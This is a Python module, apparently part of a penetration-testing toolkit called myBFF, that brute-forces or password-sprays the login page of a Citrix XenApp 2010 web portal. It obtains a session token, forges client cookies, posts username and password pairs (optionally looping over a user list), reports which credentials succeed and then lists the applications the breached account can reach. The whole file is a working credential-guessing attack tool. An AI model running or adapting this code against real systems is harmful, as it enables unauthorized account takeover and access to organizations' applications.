#! /bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class citrixbrute2010():
    ignore = ['Settings','Log Off', 'Messages']
    def appDetect(self, config, c, cookies2, cpost):
       resp3 = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False)
       m = re.search('There are no resources currently available for this user.', resp3.text)
       if m:
           print("[-]      No resources available for user.")
       else:
           o = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
           print("[+]      The following apps/tabs are accessible to " + config["USERNAME"] + ":")
           for n in o:
               if n not in self.ignore:
                   print('[+]                 ' + n)
    def connectTest(self, config, payload, SESSION_TOKEN, cookies2):
        with session() as c:
           cpost = c.post(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, data=payload, allow_redirects=False, verify=False)
           m = re.search('default.aspx', cpost.text)
           if m:
               print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
               self.appDetect(config, c, cookies2, cpost)
           else:
               print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        with session() as c:
            silentDetect = c.get(config["protocol"] + '://' + config["HOST"] + '/Citrix/XenApp/auth/silentDetection.aspx', allow_redirects=True, verify=False)
            cookie2 = silentDetect.cookies['ASP.NET_SessionId']
            cookies2 = dict()
            cookies2['ASP.NET_SessionId'] = cookie2
            cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
            cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
            cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
            cget = c.get(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=False)
            stoken = re.search("SESSION_TOKEN.*>", cget.text)
            g = stoken.group()
            SESSION_TOKEN = g.split('"')[2]
            if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        payload = {
                            'SESSION_TOKEN':SESSION_TOKEN,
                            'LoginType': 'Explicit',
                            'user': config["USERNAME"],
                            'password': config["PASSWORD"]
                            }
                        self.connectTest(config, payload, SESSION_TOKEN, cookies2)
            else:
                payload = {
                    'SESSION_TOKEN':SESSION_TOKEN,
                    'LoginType': 'Explicit',
                    'user': config["USERNAME"],
                    'password': config["PASSWORD"]
                    }
                self.connectTest(config, payload, SESSION_TOKEN, cookies2)